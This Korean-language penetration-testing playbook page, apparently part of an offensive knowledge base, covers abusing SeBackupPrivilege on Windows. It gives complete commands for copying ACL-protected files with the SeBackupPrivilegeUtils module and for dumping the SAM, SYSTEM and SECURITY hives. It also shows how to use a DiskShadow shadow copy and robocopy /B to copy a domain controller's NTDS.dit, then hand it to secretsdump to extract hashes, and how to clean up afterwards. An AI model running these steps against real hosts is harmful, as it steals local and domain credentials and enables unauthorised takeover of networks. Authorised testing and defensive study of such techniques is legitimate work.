---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트에서 명령 실행", "현재 token에 SeBackupPrivilege가 할당됨"]
필요권한: ["SeBackupPrivilege", "DC의 NTDS.dit 수집 시 Backup Operators 구성원 또는 동등한 backup 권한"]
필요조건: ["대상에서 PowerShell 모듈 또는 robocopy를 실행할 수 있음", "기존 파일과 충돌하지 않는 복사본·모듈 경로", "DC VSS 경로는 DiskShadow 실행 권한과 사용하지 않는 drive letter"]
결과: ["ACL로 보호된 파일 사본", "SAM·SYSTEM 또는 NTDS.dit 오프라인 분석 입력"]
---

# SeBackupPrivilege로 보호된 파일과 hive 복사

## 한 줄 판단

현재 token에 `SeBackupPrivilege`가 있고 대상 Windows 호스트에서 backup semantics로 파일을 복사할 수 있으면, 일반 읽기가 거부된 파일과 registry hive의 사본을 확보하여 필요한 자격 증명·정보 추출 경로로 넘긴다.

## 사용할 때

- `whoami /priv`에 `SeBackupPrivilege`가 표시되고, 서비스 계정 또는 `Backup Operators` 멤버십처럼 해당 권한의 출처를 확인했을 때.
- 명령은 공격 호스트가 아니라 파일·hive가 있는 대상 Windows 호스트에서 실행한다.
- 일반 `type`, `Get-Content`, `copy`가 접근 거부되지만 파일의 경로와 필요한 산출물이 확인됐을 때.
- 도메인 컨트롤러에서는 `NTDS.dit`이 잠겨 있으므로 VSS 섀도 복사본에서 수집해야 한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 현재 token 권한 | `SeBackupPrivilege`가 존재하고 사용 가능한 상태 | `whoami /priv` | 권한이 없으면 일반 파일 ACL 또는 다른 권한 상승 경로 확인 |
| 실행 위치 | 파일이 있는 대상 Windows 호스트의 PowerShell 또는 CMD | `hostname`, `whoami` | 공격 호스트가 아닌 대상 세션에서 실행 |
| 대상 파일 | 읽기 거부된 파일·같은 시점의 hive 또는 섀도 복사본 `NTDS.dit` | `dir`, `Get-ChildItem` | 파일 경로·출처와 민감도를 먼저 확인 |
| 저장 경로 | 현재 계정이 사본을 만들 수 있고 기존 파일과 충돌하지 않는 exact 경로 | 각 `<COPIED_PATH>`에 `Test-Path -LiteralPath`가 `False`인지 확인 | 고유 경로와 회수 경로 준비 |
| DC 섀도 복사 권한 | `diskshadow`를 실행하고 해당 volume의 shadow를 만들 수 있는 관리자 또는 동등한 권한 | `whoami /groups`, `whoami /priv`와 `create`의 실제 결과 | Backup Operators 이름만으로 성공을 단정하지 말고 로컬 정책·VSS provider·실행 권한 확인 |

## 실행

### PowerShell 모듈로 보호된 파일 복사

대상 Windows 호스트에서 `SeBackupPrivilegeUtils` 모듈을 불러온 뒤 privilege를 활성화하고, 일반 읽기가 거부된 파일을 별도 경로로 복사한다. 현재 token의 privilege 할당·활성화는 [[Windows 액세스 토큰과 특권 활성화]]를, backup 읽기와 원본 DACL·출력 경로 권한의 관계는 [[Windows 파일 소유권과 ACL]]을 따른다.

모듈을 새로 반입한다면 반입 전에 두 `<SEBACKUP_MODULE_PATH>`가 없었는지 확인한다. `<COPIED_FILE_PATH>`도 복사 전에 존재하지 않는 고유 경로여야 한다.

```powershell
Test-Path -LiteralPath '<SEBACKUP_UTILS_MODULE_PATH>'
Test-Path -LiteralPath '<SEBACKUP_CMDLETS_MODULE_PATH>'
Test-Path -LiteralPath '<COPIED_FILE_PATH>'
```

세 출력이 `False`인 경로를 정하고 [[상황별 파일 전송]]으로 module을 반입한 뒤 exact 경로와 SHA-256을 기록한다.

```powershell
Get-FileHash -Algorithm SHA256 -LiteralPath '<SEBACKUP_UTILS_MODULE_PATH>'
Get-FileHash -Algorithm SHA256 -LiteralPath '<SEBACKUP_CMDLETS_MODULE_PATH>'
Import-Module '<SEBACKUP_UTILS_MODULE_PATH>'
Import-Module '<SEBACKUP_CMDLETS_MODULE_PATH>'
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege '<PROTECTED_FILE>' '<COPIED_FILE_PATH>'
```

확인할 출력:

- `Get-SeBackupPrivilege`의 `enabled`와 `Copy-FileSeBackupPrivilege`의 `Copied <SIZE> bytes`.
- 사본의 hash·크기와 내용을 확인한다. 복사 성공은 파일 내용의 유용성이나 관리자 권한을 뜻하지 않는다.
- `Opening input file` 또는 원본 open 단계의 access denied이면 현재 PowerShell process에 privilege가 존재·활성화됐는지, 불러온 DLL이 process architecture·.NET runtime과 맞는지, 실제 명령이 backup semantics 구현인지, 원본 경로·EFS 상태와 공유 위반 여부를 확인한다. 현재 upstream 모듈은 원본을 `GENERIC_READ`와 `FILE_FLAG_BACKUP_SEMANTICS`로 열므로 명시적 deny ACE를 일반 실패 원인으로 보지 않는다.
- `Error creating output file`이면 원본 ACL 대신 `<COPIED_FILE_PATH>`의 사전 존재, parent directory 쓰기 권한과 모듈의 overwrite 선택을 확인한다. 출력 handle은 일반 `GENERIC_WRITE`로 열리므로 이 경로의 ACL은 별도로 적용된다.

### registry hive 저장과 오프라인 분석 연결

```powershell
Test-Path -LiteralPath '<SAM_SAVE_PATH>'
Test-Path -LiteralPath '<SYSTEM_SAVE_PATH>'
Test-Path -LiteralPath '<SECURITY_SAVE_PATH>'
reg save HKLM\SAM '<SAM_SAVE_PATH>'
reg save HKLM\SYSTEM '<SYSTEM_SAVE_PATH>'
reg save HKLM\SECURITY '<SECURITY_SAVE_PATH>'
```

`The operation completed successfully`와 세 파일 생성을 확인한 뒤 [[Windows SAM SECURITY SYSTEM 덤프]]에서 산출물별로 분석한다.

### DC의 섀도 복사본에서 NTDS.dit 복사

DC에서만 실제 `DSA Database file`이 있는 volume을 확인하고, 현재 Microsoft DiskShadow 문법의 persistent shadow를 고유 drive letter로 노출한 후 `robocopy /B`로 `NTDS.dit` 사본을 만든다. `robocopy /B`는 backup mode로 파일을 복사하며, 일반 복사 권한과 같은 결과로 해석하지 않는다.

먼저 대상 volume, 기존 shadow, 사용 가능한 drive letter와 exact 산출물 경로를 확인한다. `<SHADOW_DRIVE>`에는 콜론이 없는 한 글자 drive letter를 기록한다.

```powershell
reg query 'HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' /v 'DSA Database file'
Get-CimInstance Win32_ShadowCopy | Select-Object ID,VolumeName,InstallDate
Get-PSDrive -Name '<SHADOW_DRIVE>' -ErrorAction SilentlyContinue
Test-Path -LiteralPath '<NTDS_COPY_PATH>'
Test-Path -LiteralPath '<NTDS_SYSTEM_SAVE_PATH>'
```

`DSA Database file`의 drive를 `<NTDS_VOLUME>`으로, drive를 제외한 상위 디렉터리를 `<NTDS_RELATIVE_DIR>`로 기록한다. 선택한 drive letter 조회와 두 `Test-Path`가 결과 없음·`False`인지 확인한다. 기존 shadow 목록은 삭제 대상을 찾는 용도가 아니라 새 shadow ID를 구분하기 위한 기준선이다.

```text
diskshadow
set context persistent nowriters
begin backup
add volume <NTDS_VOLUME>: alias ntdsvol
create
expose %ntdsvol% <SHADOW_DRIVE>:
end backup
exit
```

```cmd
robocopy /B "<SHADOW_DRIVE>:\<NTDS_RELATIVE_DIR>" "<NTDS_COPY_DIR>" ntds.dit
reg save HKLM\SYSTEM "<NTDS_SYSTEM_SAVE_PATH>"
```

`create` 출력의 `Shadow Copy ID`를 `<SHADOW_ID>`로, alias와 exposed path를 함께 기록한다. `robocopy` 결과에서 `Copied`가 1이고 `FAILED`가 0인지, `reg save`가 `The operation completed successfully`인지 확인한다. NTDS 사본과 해당 설치의 `SYSTEM` hive가 있어야 오프라인 분석 입력이 완성되며, 사본만으로 Domain Admin 세션이나 DCSync 권한을 얻은 것은 아니다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 보호 파일 사본을 읽을 수 있음 | ACL 우회 복사 성공 | 민감 정보·자격 증명 후보 | [[Windows 파일 자격증명 검색]] 또는 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| SAM·SECURITY·SYSTEM 세트 확보 | 로컬 자격 증명 분석 입력 확보 | 오프라인 hive 세트 | [[Windows SAM SECURITY SYSTEM 덤프]] |
| NTDS.dit와 SYSTEM hive 확보 | 도메인 자격 증명 오프라인 분석 입력 확보 | NTDS 분석 입력 | [[impacket-secretsdump]]로 계정별 hash를 추출한 뒤 실제 인증을 검증 |
| privilege가 있으나 복사 실패 | privilege 비활성, 모듈 호환성·backup open, source 공유·암호화 또는 출력 경로 조건 미충족 | 원본 미획득 | 원본 open 오류와 출력 생성 오류를 분리하고 privilege·모듈·경로를 해당 단계부터 확인 |

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상에 만든 보호 파일·hive·NTDS 사본 | 민감 데이터가 대상 디스크와 회수 경로에 남음 | 작업 전 부재를 확인한 exact 경로·hash·전송 완료 기록 | 연결이 살아 있을 때 이번 작업으로 만든 exact 사본만 삭제 |
| 새로 반입한 SeBackupPrivilegeUtils module | 대상 디스크에 DLL이 남음 | 반입 전 부재, exact 경로와 SHA-256 기록 | 이번 작업에서 반입한 두 exact module 파일만 삭제 |
| `<SHADOW_DRIVE>:` 노출 | shadow 내용이 drive letter로 계속 노출됨 | `Get-PSDrive -Name '<SHADOW_DRIVE>'`와 DiskShadow 목록 | exact drive letter를 `unexpose` |
| persistent VSS `<SHADOW_ID>` | 디스크 공간과 shadow가 종료 뒤에도 남음 | 생성 때 기록한 ID를 `vssadmin list shadows`에서 대조 | exact shadow ID 하나만 `delete shadows id`로 제거 |

분석 입력의 회수와 hash 확인이 끝난 뒤, 원격 연결이 살아 있을 때 대상 Windows 호스트에서 파일 → 노출 경로 → shadow 순서로 정리한다. 기존 shadow를 이름·시간만 보고 삭제하거나 `delete shadows all`을 사용하지 않는다.

```powershell
Remove-Item -LiteralPath '<COPIED_FILE_PATH>' -Force
Remove-Item -LiteralPath '<SAM_SAVE_PATH>' -Force
Remove-Item -LiteralPath '<SYSTEM_SAVE_PATH>' -Force
Remove-Item -LiteralPath '<SECURITY_SAVE_PATH>' -Force
Remove-Item -LiteralPath '<NTDS_COPY_PATH>' -Force
Remove-Item -LiteralPath '<NTDS_SYSTEM_SAVE_PATH>' -Force
Test-Path -LiteralPath '<COPIED_FILE_PATH>'
Test-Path -LiteralPath '<SAM_SAVE_PATH>'
Test-Path -LiteralPath '<SYSTEM_SAVE_PATH>'
Test-Path -LiteralPath '<SECURITY_SAVE_PATH>'
Test-Path -LiteralPath '<NTDS_COPY_PATH>'
Test-Path -LiteralPath '<NTDS_SYSTEM_SAVE_PATH>'
```

위 명령 중 실제로 선택한 분기에서 생성했고 작업 전 부재를 확인한 경로만 실행한다. 모듈도 이번 작업에서 반입한 경우에만 exact 경로를 제거한다.

```powershell
Remove-Item -LiteralPath '<SEBACKUP_UTILS_MODULE_PATH>' -Force
Remove-Item -LiteralPath '<SEBACKUP_CMDLETS_MODULE_PATH>' -Force
Test-Path -LiteralPath '<SEBACKUP_UTILS_MODULE_PATH>'
Test-Path -LiteralPath '<SEBACKUP_CMDLETS_MODULE_PATH>'
```

```text
diskshadow
unexpose <SHADOW_DRIVE>:
delete shadows id <SHADOW_ID>
exit
```

```powershell
Get-PSDrive -Name '<SHADOW_DRIVE>' -ErrorAction SilentlyContinue
vssadmin list shadows
```

선택한 산출물·모듈의 `Test-Path`가 모두 `False`, drive 조회 결과가 없고 shadow 목록에 exact `<SHADOW_ID>`가 없어야 대상 정리를 확인한 것이다. `unexpose` 실패이면 기록한 drive letter와 expose 성공 여부를, shadow 삭제 실패이면 exact ID·VSS provider와 현재 권한을 먼저 확인한다. 연결이 이미 끊어졌거나 ID를 기록하지 못해 원격 상태를 확인할 수 없으면 복구 완료로 표시하지 않는다. 회수한 로컬 사본은 증거 보존·민감 자료 폐기 정책에 따라 exact 경로로 별도 처리한다.

## 관련 공격기법

- [[상황별 파일 전송]]
- [[Windows SAM SECURITY SYSTEM 덤프]]

## 관련 도구

- [[SeBackupPrivilegeUtils]]
- [[impacket-secretsdump]]


## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft: Back up files and directories](https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [Microsoft: reg save](https://learn.microsoft.com/windows-server/administration/windows-commands/reg-save)
- [Microsoft: DiskShadow](https://learn.microsoft.com/windows-server/administration/windows-commands/diskshadow)
- [Microsoft: set context](https://learn.microsoft.com/windows-server/administration/windows-commands/set-context)
- [Microsoft: unexpose](https://learn.microsoft.com/windows-server/administration/windows-commands/unexpose)
- [Microsoft: delete shadows](https://learn.microsoft.com/windows-server/administration/windows-commands/delete-shadows)
- [Microsoft: robocopy](https://learn.microsoft.com/windows-server/administration/windows-commands/robocopy)
- [Microsoft: File Security and Access Rights](https://learn.microsoft.com/windows/win32/fileio/file-security-and-access-rights)
- [SeBackupPrivilegeUtils source](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeUtils/Utils.cs)
